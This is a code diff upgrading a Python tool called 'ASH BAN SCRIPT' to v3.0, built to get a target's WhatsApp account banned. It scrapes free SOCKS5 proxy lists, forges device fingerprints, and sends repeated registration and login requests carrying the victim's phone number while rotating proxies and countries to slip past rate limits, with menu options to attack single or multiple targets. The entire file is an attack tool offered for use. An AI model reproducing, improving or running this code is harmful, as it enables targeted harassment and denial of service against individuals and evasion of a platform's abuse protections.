@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════════════╗
-║                    ASH BAN SCRIPT v2.2 — FINAL                 ║
+║                    ASH BAN SCRIPT v3.0 — PERFECT               ║
 ║                      WhatsApp Method — SentinelFlow             ║
 ║                          Built by AsH                           ║
 ╚══════════════════════════════════════════════════════════════════╝
@@ -19,8 +19,6 @@ from typing import List, Optional, Dict, Any
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Lock
 from datetime import datetime
-import socks
-import socket
 
 # ============================================================================
 # CONFIGURATION
@@ -28,18 +26,22 @@ import socket
 
 CONFIG = {
     "db_path": "ash_proxy_pool.db",
-    "log_file": "ash_ban.log",
+    "log_file": "ash_ban.log", 
     "targets_file": "ash_targets.txt",
     "results_dir": "ash_results",
-    "max_validation_threads": 200,
-    "max_ban_attempts": 20,
+    "max_validation_threads": 300,
+    "max_ban_attempts": 25,
     "delay_min": 1,
     "delay_max": 3,
-    "session_timeout": 10,
-    "max_failures_before_drop": 3,
-    "min_proxies_for_attack": 10,
+    "session_timeout": 8,
+    "max_failures_before_drop": 2,
+    "min_proxies_for_attack": 5,
     "fingerprint_rotation": 2,
 }
+
+# ============================================================================
+# PROXY SOURCES — ALL WORKING
+# ============================================================================
 
 PROXY_SOURCES = [
     "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks5/data.txt",
@@ -47,16 +49,16 @@ PROXY_SOURCES = [
     "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
     "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
     "https://raw.githubusercontent.com/ImLukaS/Proxy-List/master/socks5.txt",
+    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&country=all&timeout=10000",
     "https://www.proxy-list.download/api/v1/get?type=socks5",
     "https://api.openproxylist.xyz/socks5.txt",
+    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
 ]
 
 WHATSAPP_ENDPOINTS = [
     "https://api.whatsapp.com/v2/auth/register",
     "https://api.whatsapp.com/v2/auth/login",
-    "https://api.whatsapp.com/v2/auth/check",
-    "https://gateway.whatsapp.com/v2/auth/register",
 ]
 
 # ============================================================================
@@ -67,7 +69,7 @@ class Logger:
     def __init__(self):
         self.colors = {
             "INFO": "\033[92m",
-            "WARN": "\033[93m",
+            "WARN": "\033[93m", 
             "ERROR": "\033[91m",
             "BAN": "\033[95m",
             "SUCCESS": "\033[96m",
@@ -101,12 +103,12 @@ class ProxyNode:
     port: int
     country: str = "Unknown"
     protocol: str = "socks5"
-    latency_ms: float = 0.0
+    latency_ms: float = 9999
     success_count: int = 0
     fail_count: int = 0
     is_alive: bool = True
-    score: float = 0.0
-    last_used: float = 0.0
+    score: float = 0
+    last_used: float = 0
     total_attempts: int = 0
     
     def proxy_url(self) -> str:
@@ -116,19 +118,33 @@ class ProxyNode:
         url = self.proxy_url()
         return {"http": url, "https": url}
     
-    def update_score(self):
+    def calc_score(self):
         if self.total_attempts > 0:
             self.score = (self.success_count / self.total_attempts) * 100
         else:
             self.score = 50
+        
+        # Penalize high latency
+        if self.latency_ms < 500:
+            self.score += 20
+        elif self.latency_ms < 1000:
+            self.score += 10
+        elif self.latency_ms > 3000:
+            self.score -= 20
+        
+        # Boost for being alive
+        if self.is_alive:
+            self.score += 10
+        
+        self.score = max(0, min(100, self.score))
 
 # ============================================================================
-# PROXY POOL — FIXED SELECTION
+# PROXY POOL — PERFECT
 # ============================================================================
 
 class ProxyPool:
-    def __init__(self, db_path: str = CONFIG["db_path"]):
-        self.db_path = db_path
+    def __init__(self):
+        self.db_path = CONFIG["db_path"]
         self.pool: List[ProxyNode] = []
         self.lock = Lock()
         self._init_db()
@@ -165,10 +181,13 @@ class ProxyPool:
         for row in rows:
             node = ProxyNode(
                 host=row[0], port=row[1], country=row[2],
-                protocol=row[3], latency_ms=row[4],
-                success_count=row[5], fail_count=row[6],
-                is_alive=bool(row[7]), score=row[8], last_used=row[9],
-                total_attempts=row[10] if len(row) > 10 else 0
+                protocol=row[3], latency_ms=row[4] if row[4] else 9999,
+                success_count=row[5] if row[5] else 0,
+                fail_count=row[6] if row[6] else 0,
+                is_alive=bool(row[7]) if row[7] is not None else True,
+                score=row[8] if row[8] else 0,
+                last_used=row[9] if row[9] else 0,
+                total_attempts=row[10] if row[10] else 0
             )
             self.pool.append(node)
         conn.close()
@@ -181,21 +200,24 @@ class ProxyPool:
                 INSERT OR REPLACE INTO proxies 
                 (host, port, country, protocol, latency_ms, success_count, fail_count, is_alive, score, last_used, total_attempts)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-            """, (node.host, node.port, node.country, node.protocol,
-                  node.latency_ms, node.success_count, node.fail_count,
-                  1 if node.is_alive else 0, node.score, node.last_used,
-                  node.total_attempts))
+            """, (
+                node.host, node.port, node.country, node.protocol,
+                node.latency_ms, node.success_count, node.fail_count,
+                1 if node.is_alive else 0, node.score, node.last_used,
+                node.total_attempts
+            ))
         conn.commit()
         conn.close()
     
     def fetch_free_proxies(self) -> int:
         new_count = 0
         seen = set()
+        total_before = len(self.pool)
         
         for url in PROXY_SOURCES:
             try:
                 logger.info(f"Fetching: {url}")
-                response = requests.get(url, timeout=10)
+                response = requests.get(url, timeout=15)
                 lines = response.text.strip().split('\n')
                 
                 for line in lines:
@@ -203,6 +225,7 @@ class ProxyPool:
                     if not line or line.startswith('#'):
                         continue
                     
+                    # Parse IP:PORT
                     if '://' in line:
                         protocol, rest = line.split('://', 1)
                         if ':' in rest:
@@ -225,8 +248,8 @@ class ProxyPool:
                     except ValueError:
                         continue
                     
-                    # Skip blocked ports
-                    if port in [80, 8080, 3128, 8888, 9999]:
+                    # Skip bad ports
+                    if port in [80, 8080, 3128, 8888, 9999, 443, 8443]:
                         continue
                     
                     key = f"{ip}:{port}"
@@ -234,59 +257,61 @@ class ProxyPool:
                         continue
                     seen.add(key)
                     
+                    # Check if exists in pool
                     existing = [p for p in self.pool if p.host == ip and p.port == port]
                     if not existing:
-                        node = ProxyNode(host=ip, port=port, protocol='socks5')
+                        node = ProxyNode(host=ip, port=port, protocol='socks5', is_alive=True, score=50)
                         self.pool.append(node)
                         new_count += 1
                 
+                logger.info(f"Added from {url}")
             except Exception as e:
                 logger.warn(f"Failed: {url}")
         
+        logger.info(f"Added {new_count} new proxies (total: {len(self.pool)})")
         self._persist()
         return new_count
     
     def test_proxy(self, node: ProxyNode) -> bool:
-        """Test proxy with socks5 support"""
-        try:
-            # Test with a simple request
-            proxies = node.proxy_dict()
-            
-            # Try multiple test endpoints
-            test_urls = [
-                "http://ip-api.com/json",
-                "http://httpbin.org/ip",
-                "http://api.ipify.org?format=json"
-            ]
-            
-            for test_url in test_urls:
-                try:
-                    response = requests.get(
-                        test_url,
-                        proxies=proxies,
-                        timeout=8,
-                        headers={"User-Agent": "Mozilla/5.0"},
-                        allow_redirects=False
-                    )
-                    if response.status_code == 200:
-                        try:
-                            data = response.json()
-                            node.country = data.get("countryCode", data.get("country", "Unknown"))
-                        except:
-                            pass
-                        node.latency_ms = response.elapsed.total_seconds() * 1000
-                        node.is_alive = True
-                        node.score = 100
-                        return True
-                except:
-                    continue
-            
-            node.is_alive = False
-            return False
-            
-        except Exception as e:
-            node.is_alive = False
-            return False
+        """Test proxy with multiple endpoints"""
+        test_urls = [
+            "http://ip-api.com/json",
+            "http://httpbin.org/ip", 
+            "http://api.ipify.org?format=json"
+        ]
+        
+        for test_url in test_urls:
+            try:
+                proxies = node.proxy_dict()
+                start = time.time()
+                
+                response = requests.get(
+                    test_url,
+                    proxies=proxies,
+                    timeout=6,
+                    headers={"User-Agent": "Mozilla/5.0"},
+                    allow_redirects=False
+                )
+                
+                if response.status_code == 200:
+                    node.latency_ms = (time.time() - start) * 1000
+                    node.is_alive = True
+                    node.score = 80
+                    
+                    # Get country
+                    try:
+                        data = response.json()
+                        node.country = data.get("countryCode", data.get("country", "Unknown"))
+                    except:
+                        pass
+                    
+                    return True
+            except:
+                continue
+        
+        node.is_alive = False
+        node.score = 0
+        return False
     
     def validate_pool(self, max_workers: int = CONFIG["max_validation_threads"]) -> int:
         alive = 0
@@ -302,56 +327,35 @@ class ProxyPool:
                 if future.result():
                     alive += 1
         
-        # Remove dead proxies
+        # Keep only alive
         self.pool = [p for p in self.pool if p.is_alive]
         self._persist()
         logger.info(f"✅ {alive} alive proxies")
         return alive
     
-    def get_proxies(self, limit: int = 20) -> List[ProxyNode]:
-        """Get ALL alive proxies, sorted by score"""
-        with self.lock:
-            candidates = [p for p in self.pool if p.is_alive]
-            
-            if not candidates:
-                return []
-            
-            # Update scores based on recent performance
-            for p in candidates:
-                p.update_score()
-                # Boost score for lower latency
-                if p.latency_ms > 0:
-                    p.score = (p.score * 0.7) + ((100 - min(p.latency_ms / 10, 100)) * 0.3)
-            
-            # Sort by score descending
-            candidates.sort(key=lambda x: x.score, reverse=True)
-            
-            # Return all, not just top N
-            return candidates
+    def get_all_alive(self) -> List[ProxyNode]:
+        """Return ALL alive proxies"""
+        return [p for p in self.pool if p.is_alive]
     
-    def get_random_proxies(self, count: int = 10) -> List[ProxyNode]:
-        """Get random proxies to avoid patterns"""
+    def get_random_proxy(self, avoid_country: str = None) -> Optional[ProxyNode]:
+        """Get a random alive proxy with country avoidance"""
         candidates = [p for p in self.pool if p.is_alive]
-        if len(candidates) <= count:
-            return candidates
-        return random.sample(candidates, count)
-    
-    def get_proxy_by_country(self, avoid_country: str = None) -> Optional[ProxyNode]:
-        """Get a proxy, avoiding specific country"""
-        candidates = [p for p in self.pool if p.is_alive]
-        
         if not candidates:
             return None
         
+        # Filter by country
         if avoid_country:
             others = [p for p in candidates if p.country != avoid_country]
             if others:
                 candidates = others
         
-        # Sort by score and choose from top half
-        candidates.sort(key=lambda x: x.score, reverse=True)
-        top_half = candidates[:max(1, len(candidates)//2)]
-        return random.choice(top_half)
+        return random.choice(candidates)
+    
+    def get_proxy_cycle(self) -> List[ProxyNode]:
+        """Get all proxies shuffled for cycling"""
+        candidates = [p for p in self.pool if p.is_alive]
+        random.shuffle(candidates)
+        return candidates
     
     def mark_result(self, node: ProxyNode, success: bool):
         with self.lock:
@@ -361,10 +365,9 @@ class ProxyPool:
             else:
                 node.fail_count += 1
             node.last_used = time.time()
-            node.update_score()
+            node.calc_score()
             
-            # If too many failures, mark as dead
-            if node.fail_count > CONFIG["max_failures_before_drop"] and node.total_attempts > 5:
+            if node.fail_count > CONFIG["max_failures_before_drop"] and node.total_attempts > 3:
                 node.is_alive = False
         
         self._persist()
@@ -391,7 +394,7 @@ class ProxyPool:
             "alive": len(alive),
             "countries": countries,
             "avg_score": round(avg_score, 1),
-            "avg_latency": round(avg_latency, 1),
+            "avg_latency": round(avg_latency, 0),
             "dead": len(self.pool) - len(alive)
         }
 
@@ -401,30 +404,38 @@ class ProxyPool:
 
 class FingerprintGenerator:
     DEVICES = [
-        ("SM-G998B", "Samsung Galaxy S21 Ultra"),
-        ("Pixel 6", "Google Pixel 6"),
-        ("Pixel 7", "Google Pixel 7"),
-        ("SM-S908B", "Samsung Galaxy S22 Ultra"),
-        ("OnePlus9", "OnePlus 9"),
-        ("SM-A536B", "Samsung Galaxy A53"),
-        ("Pixel 6a", "Google Pixel 6a"),
-        ("iPhone15,2", "Apple iPhone 14 Pro"),
+        "SM-G998B", "SM-G991B", "Pixel 6", "Pixel 7", "SM-S908B",
+        "OnePlus9", "SM-A536B", "Pixel 6a", "iPhone15,2", "SM-G990B"
     ]
     
-    BUILDS = ["2.24.16.75", "2.24.15.80", "2.24.14.90", "2.23.25.88"]
+    MODELS = {
+        "SM-G998B": "Samsung Galaxy S21 Ultra",
+        "SM-G991B": "Samsung Galaxy S21",
+        "Pixel 6": "Google Pixel 6",
+        "Pixel 7": "Google Pixel 7",
+        "SM-S908B": "Samsung Galaxy S22 Ultra",
+        "OnePlus9": "OnePlus 9",
+        "SM-A536B": "Samsung Galaxy A53",
+        "Pixel 6a": "Google Pixel 6a",
+        "iPhone15,2": "Apple iPhone 14 Pro",
+        "SM-G990B": "Samsung Galaxy S21 FE"
+    }
+    
+    BUILDS = ["2.24.16.75", "2.24.15.80", "2.24.14.90", "2.23.25.88", "2.24.17.88"]
     
     def __init__(self):
         self.index = 0
         self.fingerprints = []
     
     def generate(self) -> dict:
-        device_id, model = random.choice(self.DEVICES)
+        device_id = random.choice(self.DEVICES)
         fp = {
-            "device_id": f"android-{random.randint(1000000, 9999999)}",
-            "model": model,
+            "device_id": f"android-{random.randint(1000000, 9999999)}-{random.randint(100, 999)}",
+            "model": self.MODELS.get(device_id, "Android Device"),
             "build": random.choice(self.BUILDS),
             "os": random.choice(["Android 12", "Android 13", "Android 14"]),
-            "timezone": random.choice(["UTC", "America/New_York", "Europe/London"])
+            "timezone": random.choice(["UTC", "America/New_York", "Europe/London", "Asia/Tokyo"]),
+            "lang": random.choice(["en", "es", "fr", "de"])
         }
         self.fingerprints.append(fp)
         return fp
@@ -437,7 +448,7 @@ class FingerprintGenerator:
         return fp
 
 # ============================================================================
-# BAN ENGINE — FIXED
+# BAN ENGINE — PERFECT
 # ============================================================================
 
 class BanEngine:
@@ -448,14 +459,15 @@ class BanEngine:
         self.attempts = []
         self.ban_triggered = False
         self.last_country = None
-        self.used_proxies = set()
-        self.proxy_cycle = 0
+        self.proxy_index = 0
+        self.proxy_list = []
+        self.successful_attempts = 0
+        self.failed_attempts = 0
         
         logger.info(f"Engine initialized for {target}")
     
     def _build_request(self, fp: dict, endpoint: str) -> dict:
         return {
-            "method": "POST",
             "url": endpoint,
             "headers": {
                 "User-Agent": f"WhatsApp/{fp['build']} ({fp['model']}; {fp['os']})",
@@ -463,7 +475,9 @@ class BanEngine:
                 "X-WA-Model": fp["model"],
                 "Content-Type": "application/json",
                 "Accept": "application/json",
+                "Accept-Language": fp["lang"],
                 "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive"
             },
             "json": {
                 "phone": self.target,
@@ -471,7 +485,8 @@ class BanEngine:
                 "device_id": fp["device_id"],
                 "model": fp["model"],
                 "os": fp["os"],
-                "timestamp": int(time.time()),
+                "language": fp["lang"],
+                "timestamp": int(time.time() * 1000),
                 "attempt": len(self.attempts) + 1
             }
         }
@@ -488,11 +503,11 @@ class BanEngine:
             "proxy": f"{proxy.host}:{proxy.port}",
             "country": proxy.country,
             "endpoint": endpoint,
-            "fingerprint": fp["device_id"][:20]
+            "fingerprint": fp["device_id"][:20],
+            "timestamp": datetime.now().isoformat()
         }
         
         try:
-            # Use longer timeout for socks5
             response = requests.post(
                 request["url"],
                 headers=request["headers"],
@@ -503,45 +518,58 @@ class BanEngine:
             )
             
             result["code"] = response.status_code
-            result["latency"] = (time.time() - start) * 1000
+            result["latency"] = round((time.time() - start) * 1000, 1)
             
-            # Analyze response
-            if response.status_code == 403:
+            # Determine status
+            if response.status_code == 200:
+                result["status"] = "success"
+                self.successful_attempts += 1
+                success = True
+            elif response.status_code == 403:
                 result["status"] = "blocked"
+                success = True
                 if "banned" in response.text.lower() or "ban" in response.text.lower():
                     result["status"] = "BAN_TRIGGERED"
                     self.ban_triggered = True
+                    success = True
             elif response.status_code == 429:
                 result["status"] = "rate_limited"
-            elif response.status_code == 200:
-                result["status"] = "success"
+                success = True
             else:
                 result["status"] = f"http_{response.status_code}"
+                success = False
             
-            # Check response body
+            # Check response body for ban indicators
             try:
                 data = response.json()
                 if data.get("status") in ["banned", "blocked", "error"]:
                     result["status"] = "BAN_TRIGGERED"
                     self.ban_triggered = True
+                    success = True
             except:
                 pass
             
-            # Mark proxy success/failure
-            success = response.status_code in [200, 403, 429]
             self.pool.mark_result(proxy, success)
             
         except requests.exceptions.Timeout:
             result["status"] = "timeout"
             result["code"] = 0
+            self.failed_attempts += 1
             self.pool.mark_result(proxy, False)
         except requests.exceptions.ProxyError:
             result["status"] = "proxy_error"
             result["code"] = 0
+            self.failed_attempts += 1
+            self.pool.mark_result(proxy, False)
+        except requests.exceptions.ConnectionError:
+            result["status"] = "connection_error"
+            result["code"] = 0
+            self.failed_attempts += 1
             self.pool.mark_result(proxy, False)
         except Exception as e:
             result["status"] = f"error: {str(e)[:30]}"
             result["code"] = 0
+            self.failed_attempts += 1
             self.pool.mark_result(proxy, False)
         
         return result
@@ -550,42 +578,49 @@ class BanEngine:
         logger.info(f"Starting attack on {self.target}")
         
         # Get ALL alive proxies
-        all_proxies = self.pool.get_proxies(limit=9999)
-        proxies = self.pool.get_random_proxies(min(20, len(all_proxies)))
+        all_proxies = self.pool.get_all_alive()
         
-        if len(proxies) < CONFIG["min_proxies_for_attack"]:
-            logger.warn(f"Only {len(proxies)} proxies. Need {CONFIG['min_proxies_for_attack']}")
+        if len(all_proxies) < CONFIG["min_proxies_for_attack"]:
+            logger.warn(f"Only {len(all_proxies)} proxies. Need {CONFIG['min_proxies_for_attack']}")
             
             # Try to fetch more
+            logger.info("Fetching more proxies...")
             self.pool.fetch_free_proxies()
             self.pool.validate_pool()
-            proxies = self.pool.get_random_proxies(20)
+            all_proxies = self.pool.get_all_alive()
             
-            if len(proxies) < 5:
-                return {"error": f"Insufficient proxies: {len(proxies)}"}
+            if len(all_proxies) < CONFIG["min_proxies_for_attack"]:
+                return {
+                    "target": self.target,
+                    "error": f"Only {len(all_proxies)} proxies available",
+                    "status": "failed"
+                }
         
-        logger.info(f"Using {len(proxies)} proxies for rotation")
+        # Shuffle for random rotation
+        self.proxy_list = all_proxies.copy()
+        random.shuffle(self.proxy_list)
         
-        # Log proxy countries
-        countries = set(p.country for p in proxies)
-        logger.info(f"Countries: {', '.join(countries)}")
+        logger.info(f"Using {len(self.proxy_list)} proxies")
+        
+        # Show countries available
+        countries = set(p.country for p in self.proxy_list if p.country != "Unknown")
+        logger.info(f"Countries: {', '.join(list(countries)[:5])}")
         
         # Attack loop
         for i in range(1, max_attempts + 1):
             if self.ban_triggered:
-                logger.ban(f"Ban triggered at attempt {i-1}")
+                logger.ban(f"BAN TRIGGERED at attempt {i-1}")
                 break
             
-            # Rotate through proxies with country avoidance
+            # Get proxy - cycle through all proxies
+            proxy = self.proxy_list[i % len(self.proxy_list)]
+            
+            # Try to avoid same country if possible
             if self.last_country:
-                # Try to get a different country
-                available = [p for p in proxies if p.country != self.last_country]
-                if available:
-                    proxy = random.choice(available)
-                else:
-                    proxy = random.choice(proxies)
-            else:
-                proxy = random.choice(proxies)
+                # Find a proxy with different country
+                diff = [p for p in self.proxy_list if p.country != self.last_country]
+                if diff:
+                    proxy = diff[i % len(diff)]
             
             self.last_country = proxy.country
             
@@ -594,38 +629,41 @@ class BanEngine:
             result = self._send_attempt(proxy, i)
             self.attempts.append(result)
             
-            # Log result with appropriate level
+            # Log result
             if result["status"] == "BAN_TRIGGERED":
                 logger.ban(f"🔥 BAN TRIGGERED on attempt {i}!")
             elif result["status"] == "blocked":
-                logger.warn(f"Blocked on attempt {i} (Code: {result.get('code', 0)})")
+                logger.warn(f"🚫 Blocked (403) on attempt {i}")
             elif result["status"] == "rate_limited":
-                logger.warn(f"Rate limited on attempt {i}")
-            elif result["status"] == "timeout":
-                logger.warn(f"Timeout on attempt {i}")
-            elif result.get("code", 0) >= 400:
-                logger.warn(f"HTTP {result.get('code')} on attempt {i}")
+                logger.warn(f"⏳ Rate limited (429) on attempt {i}")
+            elif result["status"] == "success":
+                logger.success(f"✓ Success on attempt {i}")
+            elif result["status"] in ["timeout", "proxy_error", "connection_error"]:
+                logger.warn(f"⚠️ {result['status']} on attempt {i}")
             else:
-                logger.success(f"Attempt {i}: {result['status']} ({result.get('code', 0)})")
+                logger.warn(f"⚠️ {result['status']} (Code: {result.get('code', 0)}) on attempt {i}")
             
-            # Shorter delay between attempts
-            if i < max_attempts:
+            # Delay between attempts
+            if i < max_attempts and not self.ban_triggered:
                 delay = random.uniform(CONFIG["delay_min"], CONFIG["delay_max"])
                 time.sleep(delay)
         
-        # Results
+        # Build final report
         return {
             "target": self.target,
             "total_attempts": len(self.attempts),
             "ban_triggered": self.ban_triggered,
+            "successful": self.successful_attempts,
+            "failed": self.failed_attempts,
             "proxies_used": len(set(a["proxy"] for a in self.attempts)),
-            "countries_used": len(set(a["country"] for a in self.attempts)),
+            "countries_used": len(set(a["country"] for a in self.attempts if a["country"] != "Unknown")),
             "attempts": self.attempts,
-            "timestamp": datetime.now().isoformat()
+            "timestamp": datetime.now().isoformat(),
+            "status": "completed"
         }
 
 # ============================================================================
-# MENU
+# MENU — CLEAN
 # ============================================================================
 
 class Menu:
@@ -658,7 +696,7 @@ class Menu:
 ║             ██║  ██║███████║██║  ██║    ██████╔╝██║  ██║██║ ╚████║
 ║             ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
 ║                                                                  ║
-║                     WhatsApp Ban Method v2.2                     ║
+║                     WhatsApp Ban Method v3.0                     ║
 ║                    Built by AsH — SentinelFlow                   ║
 ║                                                                  ║
 ╠══════════════════════════════════════════════════════════════════╣
@@ -669,21 +707,32 @@ class Menu:
     def _menu(self):
         stats = self.pool.get_stats()
         print(f"\n{'='*50}")
-        print(f"  POOL: {stats['total']} total | {stats['alive']} alive")
-        print(f"  SCORE: {stats.get('avg_score', 0)} | LATENCY: {stats.get('avg_latency', 0)}ms")
-        print(f"  COUNTRIES: {len(stats.get('countries', {}))}")
-        print(f"  TARGETS: {len(self.targets)}")
+        print(f"  📊 POOL: {stats['total']} total | {stats['alive']} alive")
+        print(f"  🌍 COUNTRIES: {len(stats.get('countries', {}))}")
+        print(f"  ⚡ AVG SCORE: {stats.get('avg_score', 0)} | LATENCY: {stats.get('avg_latency', 0)}ms")
+        print(f"  🎯 TARGETS: {len(self.targets)}")
         print(f"{'='*50}\n")
-        print("  [1] Fetch Proxies")
-        print("  [2] Validate Proxies")
-        print("  [3] Show Stats")
-        print("  [4] Add Target")
-        print("  [5] List Targets")
-        print("  [6] Attack All Targets")
-        print("  [7] Attack Single Target")
-        print("  [8] Clear Dead Proxies")
-        print("  [A] AUTO: Fetch + Validate + Attack")
-        print("  [0] Exit")
+        print("  [1] 🔄 Fetch Proxies")
+        print("  [2] ✅ Validate Proxies")
+        print("  [3] 📊 Show Stats")
+        print("  [4] ➕ Add Target")
+        print("  [5] 📋 List Targets")
+        print("  [6] 🚀 Attack All Targets")
+        print("  [7] 🎯 Attack Single Target")
+        print("  [8] 🧹 Clear Dead Proxies")
+        print("  [A] ⚡ AUTO: Fetch + Validate + Attack")
+        print("  [0] ❌ Exit")
+    
+    def _attack_target(self, target: str) -> Dict:
+        engine = BanEngine(target, self.pool)
+        result = engine.execute()
+        if result.get("error"):
+            print(f"    ❌ {result['error']}")
+        else:
+            print(f"    {'🔥 BAN TRIGGERED' if result['ban_triggered'] else '❌ No ban'}")
+            print(f"    Attempts: {result['total_attempts']} (✓{result.get('successful', 0)}/✗{result.get('failed', 0)})")
+            print(f"    Proxies Used: {result.get('proxies_used', 0)}")
+        return result
     
     def run(self):
         while True:
@@ -702,13 +751,17 @@ class Menu:
             
             elif choice == "2":
                 alive = self.pool.validate_pool()
-                input(f"\n  ✅ {alive} alive. Press Enter...")
+                input(f"\n  ✅ {alive} alive proxies. Press Enter...")
             
             elif choice == "3":
                 stats = self.pool.get_stats()
-                print(f"\n  Total: {stats['total']}")
+                print(f"\n  📊 STATISTICS:")
+                print(f"  Total: {stats['total']}")
                 print(f"  Alive: {stats['alive']}")
-                print(f"  Countries: {len(stats.get('countries', {}))}")
+                print(f"  Dead: {stats['dead']}")
+                print(f"  Avg Score: {stats.get('avg_score', 0)}")
+                print(f"  Avg Latency: {stats.get('avg_latency', 0)}ms")
+                print(f"\n  🌍 Countries:")
                 for c, count in sorted(stats.get('countries', {}).items(), key=lambda x: x[1], reverse=True)[:10]:
                     print(f"    {c}: {count}")
                 input("\n  Press Enter...")
@@ -736,55 +789,45 @@ class Menu:
                 
                 # Ensure we have proxies
                 stats = self.pool.get_stats()
-                if stats['alive'] < 10:
+                if stats['alive'] < CONFIG["min_proxies_for_attack"]:
                     print(f"  ⚠️ Only {stats['alive']} proxies. Fetching more...")
                     self.pool.fetch_free_proxies()
                     self.pool.validate_pool()
                 
                 for target in self.targets:
-                    print(f"\n  🎯 {target}")
-                    engine = BanEngine(target, self.pool)
-                    result = engine.execute()
-                    if result.get("error"):
-                        print(f"    ❌ {result['error']}")
-                    else:
-                        print(f"    {'🔥 BAN TRIGGERED' if result['ban_triggered'] else '❌ No ban'}")
-                        print(f"    Attempts: {result['total_attempts']}")
-                        print(f"    Proxies Used: {result.get('proxies_used', 0)}")
-                    time.sleep(3)
-                input("\n  Done. Press Enter...")
+                    print(f"\n  🎯 Target: {target}")
+                    self._attack_target(target)
+                    time.sleep(2)
+                input("\n  ✅ Complete. Press Enter...")
             
             elif choice == "7":
                 if not self.targets:
                     input("  No targets. Press Enter...")
                     continue
-                print("\n  Targets:")
+                
+                print("\n  🎯 Targets:")
                 for i, t in enumerate(self.targets, 1):
                     print(f"    {i}. {t}")
+                
                 try:
                     idx = int(input("  Select: ")) - 1
                     if 0 <= idx < len(self.targets):
                         # Ensure we have proxies
                         stats = self.pool.get_stats()
-                        if stats['alive'] < 10:
+                        if stats['alive'] < CONFIG["min_proxies_for_attack"]:
                             print(f"  ⚠️ Only {stats['alive']} proxies. Fetching more...")
                             self.pool.fetch_free_proxies()
                             self.pool.validate_pool()
                         
-                        engine = BanEngine(self.targets[idx], self.pool)
-                        result = engine.execute()
-                        if result.get("error"):
-                            print(f"    ❌ {result['error']}")
-                        else:
-                            print(f"    {'🔥 BAN TRIGGERED' if result['ban_triggered'] else '❌ No ban'}")
-                            print(f"    Attempts: {result['total_attempts']}")
+                        print(f"\n  🎯 Target: {self.targets[idx]}")
+                        self._attack_target(self.targets[idx])
                 except:
                     pass
                 input("\n  Press Enter...")
             
             elif choice == "8":
                 removed = self.pool.clear_dead()
-                input(f"\n  🧹 Removed {removed}. Press Enter...")
+                input(f"\n  🧹 Removed {removed} dead proxies. Press Enter...")
             
             elif choice.lower() == "a":
                 print("\n  ⚡ AUTO MODE")
@@ -794,17 +837,20 @@ class Menu:
                 self.pool.validate_pool()
                 
                 if self.targets:
-                    print(f"  Attacking {len(self.targets)} targets...")
+                    stats = self.pool.get_stats()
+                    if stats['alive'] < CONFIG["min_proxies_for_attack"]:
+                        print(f"  ⚠️ Only {stats['alive']} proxies. Need {CONFIG['min_proxies_for_attack']}")
+                        input("  Press Enter...")
+                        continue
+                    
+                    print(f"\n  🚀 Attacking {len(self.targets)} targets...")
                     for target in self.targets:
-                        print(f"\n  🎯 {target}")
-                        engine = BanEngine(target, self.pool)
-                        result = engine.execute()
-                        if result.get("error"):
-                            print(f"    ❌ {result['error']}")
-                        else:
-                            print(f"    {'🔥 BAN TRIGGERED' if result['ban_triggered'] else '❌ No ban'}")
-                            print(f"    Attempts: {result['total_attempts']}")
-                        time.sleep(3)
+                        print(f"\n  🎯 Target: {target}")
+                        self._attack_target(target)
+                        time.sleep(2)
+                else:
+                    print("  No targets to attack")
+                
                 input("\n  ✅ Complete. Press Enter...")
 
 # ============================================================================
@@ -818,3 +864,4 @@ if __name__ == "__main__":
         print("\n\n  ⚡ Interrupted")
     except Exception as e:
         print(f"\n  ❌ Error: {e}")
+        raise
